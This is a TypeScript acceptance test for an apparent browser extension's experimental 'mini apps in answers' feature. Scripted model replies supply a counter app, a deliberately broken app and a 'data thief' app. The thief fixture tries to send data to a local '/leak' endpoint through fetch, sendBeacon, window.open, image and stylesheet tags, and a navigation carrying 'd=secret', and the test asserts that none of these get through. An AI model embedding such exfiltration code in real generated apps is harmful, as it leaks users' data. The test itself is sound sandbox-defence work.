/**
 * 实验功能「回答里的小程序」。
 *   npx tsx scripts/acceptance/real-path/mini-apps.mts --headless
 * 脚本模型写三个小程序：计数器（bys.save / bys.say）、往本机服务器偷数据的、一加载就报错的。
 * 先在开关关着时看只出一句说明；到设置页打开后原地换成小程序；点「加一」、放进输入框、重开侧栏接着算；
 * 偷数据的服务器一次也收不到；报错的给「让助手修好」，点了才发；最后关掉开关又只剩说明。
 */
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import { REPO, launchRealPath, requireHeadless, siteAddress, sleep, until } from "./harness.mts";
import { startScriptedModel } from "./scripted-model.mts";

requireHeadless();

const artifacts = join(REPO, "out/acceptance/real-path", `${new Date().toISOString().replace(/[:.]/g, "-")}-mini-apps`);

await mkdir(artifacts, { recursive: true });

const hits: string[] = [];

const site = createServer((req, res) => { if (req.url?.startsWith("/leak")) hits.push(req.url); res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end("<!doctype html><title>练习页</title><p>练习页</p>"); });

await new Promise<void>(resolve => site.listen(0, "127.0.0.1", resolve));

const origin = `http://127.0.0.1:${siteAddress(site).port}`;

const COUNTER = `点「加一」试试。
<app title="计数器">
<style>#b{width:100%;height:40px;font-size:16px;border:1px solid var(--bys-border);border-radius:8px;background:var(--bys-subtle);color:var(--bys-text)}#out{font-size:28px;font-weight:600;margin:12px 0}.tall{height:260px;border:1px dashed var(--bys-border);border-radius:8px}</style>
<button id="b">加一</button><div id="out">0</div><div class="tall"></div>
<script>
let n = (bys.state && bys.state.n) || 0;
const out = document.getElementById("out");
out.textContent = n;
if (bys.state) bys.say("恢复到 " + n);
document.getElementById("b").onclick = () => { n++; out.textContent = n; bys.save({ n }); bys.say("计数 " + n); };
</script>
</app>`;

const THIEF = `这是一个小程序。
<app title="偷数据">
<p>看起来正常</p>
<img src="${origin}/leak-img"><link rel="stylesheet" href="${origin}/leak-css">
<script>
fetch("${origin}/leak-fetch").catch(() => {});
navigator.sendBeacon("${origin}/leak-beacon", "x");
try { window.open("${origin}/leak-open"); } catch {}
setTimeout(() => { location.href = "${origin}/leak-nav?d=secret"; }, 300);
</script>
</app>`;

const BROKEN = `这个会出错。
<app title="坏的">
<p>写了一半</p>
<script>throw new Error("故意的错");</script>
</app>`;

const model = await startScriptedModel([
  { match: "计数器", steps: [{ text: COUNTER, chunkDelayMs: 40 }] },
  { match: "偷数据", steps: [{ text: THIEF }] },
  { match: "坏的小程序", steps: [{ text: BROKEN }] },
  { match: "出错了", steps: [{ text: "好的，我修一下。" }] },
]);

const rp = await launchRealPath();

let error: string | null = null;

const evidence: Record<string, unknown> = {};

try {
  const blank = await until(async () => (await rp.targets()).find(t => t.type === "page" && t.url === "about:blank"), 10_000, "初始标签页");
  const work = await rp.attach(blank.targetId);
  await rp.cdp.send("Page.enable", {}, work);
  await rp.cdp.send("Page.navigate", { url: `${origin}/` }, work);
  const panel = await rp.attach(await rp.openSidePanel());
  await rp.evaluate(panel, `chrome.storage.local.set(${JSON.stringify({ inproc_model_config: { provider: "custom", modelId: "demo-model", baseUrl: model.baseUrl }, "inproc_cred:custom": { type: "api_key", key: "local-demo-no-secret" } })}).then(() => true)`);
  await until(async () => await rp.evaluate(panel, 'document.querySelector("#send-btn")?.disabled===false') || undefined, 60_000, "sidebar ready");
  const answers = () => rp.evaluate(panel, `document.querySelectorAll("#messages .msg.assistant .answer-actions").length`) as Promise<number>;
  const ask = async (text: string) => {
    const before = await answers();
    await rp.click(panel, "#input");
    await rp.typeText(panel, text);
    await rp.pressEnter(panel);
    await until(async () => await answers() > before && !(await rp.evaluate(panel, `!!document.querySelector("#messages .msg.assistant.streaming")`)) || undefined, 60_000, `回答「${text}」`);
    await sleep(500);
  };
  const lastApp = `[...document.querySelectorAll("#messages .gc-app")].at(-1)`;
  const bar = async () => await rp.evaluate(panel, `(() => { const b = ${lastApp}?.querySelector(".gc-app-bar"); return b && !b.hidden ? b.textContent : null; })()`) as string | null;
  /** 点小程序里的位置：x、y 是相对小程序框左上角的像素。 */
  const clickInApp = async (x: number, y: number) => {
    await rp.evaluate(panel, `${lastApp}.scrollIntoView({ block: "center" }), true`);
    await sleep(150);
    const r = await rp.evaluate(panel, `(() => { const r = ${lastApp}.querySelector("iframe").getBoundingClientRect(); return { x: r.x, y: r.y }; })()`) as { x: number; y: number };

    for (const type of ["mouseMoved", "mousePressed", "mouseReleased"] as const) await rp.cdp.send("Input.dispatchMouseEvent", { type, x: r.x + x, y: r.y + y, button: "left", clickCount: 1 }, panel);
  };

  // R2：写的过程中只有空位，不露出程序原文。R1：开关关着，写完只出一句怎么打开。
  const leaks: string[] = [];
  let sawPlaceholder = false;
  await rp.click(panel, "#input");
  await rp.typeText(panel, "做个计数器");
  await rp.pressEnter(panel);
  const end = Date.now() + 60_000;

  while (Date.now() < end) {
    const s = await rp.evaluate(panel, `({ text: [...document.querySelectorAll("#messages .msg.assistant")].map(m => m.innerText).join("\\n"), ph: !!document.querySelector("#messages .gc-app.gc-ph"), done: !!document.querySelector("#messages .msg.assistant .answer-actions") && !document.querySelector("#messages .msg.assistant.streaming") })`) as { text: string; ph: boolean; done: boolean };
    sawPlaceholder ||= s.ph;

    if (/<\/?(app|button|script|style)|bys\.save/.test(s.text)) leaks.push(s.text.slice(0, 200));

    if (s.done) break;
    await sleep(50);
  }
  await sleep(800);
  const off = await rp.evaluate(panel, `({ note: ${lastApp}?.querySelector(".gc-app-off")?.textContent ?? null, frame: !!${lastApp}?.querySelector("iframe") })`) as { note: string | null; frame: boolean };
  evidence.streaming = { leaks: leaks.length, sawPlaceholder, off };
  await rp.screenshot(panel, join(artifacts, "1-off.png"));
  assert.equal(leaks.length, 0, `R2: program text leaked while streaming: ${leaks[0]}`);
  assert.ok(sawPlaceholder, "R2: a placeholder shows while the app is being written");
  assert.ok(off.note?.includes("设置 → 实验功能") && !off.frame, `R1: off by default, only a note: ${JSON.stringify(off)}`);

  // R1：在设置页打开开关，同一条回答原地换成小程序。
  const settingsTab = (await rp.cdp.send("Target.createTarget", { url: `chrome-extension://${rp.extensionId}/settings.html`, background: true })).targetId;
  const settings = await rp.attach(settingsTab);
  await until(async () => await rp.evaluate(settings, 'document.querySelector("#mini-apps")?.checked === false').catch(() => false) || undefined, 15_000, "设置页的小程序开关默认关");
  await rp.evaluate(settings, 'document.querySelector("#mini-apps").scrollIntoView({ block: "center" }); true');
  await rp.click(settings, "#mini-apps");
  await until(async () => await rp.evaluate(settings, 'chrome.storage.local.get("sideagent_mini_apps").then(s => s.sideagent_mini_apps === true)') || undefined, 5_000, "打开已保存");
  await rp.screenshot(settings, join(artifacts, "2-settings.png"));
  await rp.cdp.send("Target.closeTarget", { targetId: settingsTab });
  await until(async () => await rp.evaluate(panel, `!!${lastApp}?.querySelector("iframe")`) || undefined, 10_000, "R1: 打开后原地换成小程序");

  // R2：高度跟内容走（按钮 + 数字 + 260px 的框，约 390px）。
  const height = await until(async () => { const h = await rp.evaluate(panel, `${lastApp}.querySelector("iframe").getBoundingClientRect().height`) as number; return h > 300 ? h : undefined; }, 10_000, "R2: 框高跟内容").catch(async () => await rp.evaluate(panel, `${lastApp}.querySelector("iframe").getBoundingClientRect().height`) as number);
  evidence.height = height;
  assert.ok(height > 300 && height < 500, `R2: frame height follows content: ${height}`);
  // 框高等于内容高：小程序里没有滚动条。
  await sleep(500);
  await rp.screenshot(panel, join(artifacts, "2b-height.png"));

  // R2：点两次「加一」，下面出现小程序想放进输入框的话；点「放进输入框」只放进去不发。
  await clickInApp(60, 32);
  await sleep(300);
  await clickInApp(60, 32);
  const said = await until(async () => { const b = await bar(); return b?.includes("计数 2") ? b : undefined; }, 5_000, "R2: 计数 2").catch(async () => await bar());
  evidence.said = said;
  await rp.screenshot(panel, join(artifacts, "3-counted.png"));
  assert.ok(said?.includes("计数 2"), `R2: the app works and offers a draft: ${said}`);
  const users = await rp.evaluate(panel, `document.querySelectorAll("#messages .msg.user").length`) as number;
  await rp.evaluate(panel, `${lastApp}.querySelector(".gc-app-bar button").click(), true`);
  const input = await rp.evaluate(panel, `document.querySelector("#input").value`) as string;
  assert.ok(input.includes("计数 2"), `R3: draft goes into the input box: ${input}`);
  assert.equal(await rp.evaluate(panel, `document.querySelectorAll("#messages .msg.user").length`), users, "R3: the app cannot send by itself");
  await rp.evaluate(panel, `(() => { const i = document.querySelector("#input"); i.value = ""; i.dispatchEvent(new Event("input", { bubbles: true })); return true; })()`);

  // R4：重开侧栏，小程序从 2 接着算。
  await rp.cdp.send("Page.reload", {}, panel);
  const restored = await until(async () => { const b = await bar().catch(() => null); return b?.includes("恢复到 2") ? b : undefined; }, 30_000, "R4: 恢复到 2").catch(async () => await bar().catch(() => null));
  evidence.restored = restored;
  assert.ok(restored?.includes("恢复到 2"), `R4: app state restored after reopening: ${restored}`);

  // R3：偷数据的小程序，服务器一次也收不到。
  await ask("偷数据");
  // 它一放进去就会试着跳走，被拦下后框收起：等到框出现过或那一行出现。
  await until(async () => await rp.evaluate(panel, `!!${lastApp}?.querySelector("iframe") || !${lastApp}?.querySelector(".gc-app-bar")?.hidden`) || undefined, 10_000, "偷数据的小程序放进去");
  await sleep(3_000);
  evidence.leaks = [...hits];
  const blocked = await bar();
  evidence.blocked = blocked;
  await rp.screenshot(panel, join(artifacts, "3b-blocked.png"));
  assert.deepEqual(hits, [], `R3: nothing reaches the network: ${hits.join(", ")}`);
  assert.ok(blocked?.includes("已拦下") && !(await rp.evaluate(panel, `!!${lastApp}.querySelector("iframe")`)), `R3: the blocked navigation is folded into one line: ${blocked}`);

  // R2：报错的小程序，给「让助手修好」，点了才发。
  await ask("坏的小程序");
  const broken = await until(async () => { const b = await bar(); return b?.includes("小程序出错了") ? b : undefined; }, 10_000, "R2: 报错").catch(async () => await bar());
  evidence.broken = broken;
  await rp.screenshot(panel, join(artifacts, "4-broken.png"));
  assert.ok(broken?.includes("故意的错") && broken.includes("让助手修好"), `R2: the error is shown with a fix button: ${broken}`);
  await rp.evaluate(panel, `${lastApp}.querySelector(".gc-app-bar button").click(), true`);
  await until(async () => await rp.evaluate(panel, `[...document.querySelectorAll("#messages .msg.user")].some(m => m.textContent.includes("小程序「坏的」出错了"))`) || undefined, 10_000, "R2: 点了才发出修复请求");

  // R1：关掉开关，小程序又只剩一句说明。
  await rp.evaluate(panel, `chrome.storage.local.set({ sideagent_mini_apps: false }).then(() => true)`);
  await until(async () => await rp.evaluate(panel, `[...document.querySelectorAll("#messages .gc-app")].every(a => !a.querySelector("iframe") && a.querySelector(".gc-app-off"))`) || undefined, 10_000, "R1: 关掉后只剩说明");
} catch (caught) {
  error = caught instanceof Error ? caught.stack ?? caught.message : String(caught);
} finally {
  await writeFile(join(artifacts, "result.json"), JSON.stringify({ status: error ? "FAIL" : "PASS", evidence, error }, null, 2));
  await rp.close();
  await rp.remove();
  await model.close();
  site.close();
}

console.log(JSON.stringify({ status: error ? "FAIL" : "PASS", artifacts, error: error?.split("\n")[0] ?? null }));

if (error) process.exitCode = 1;
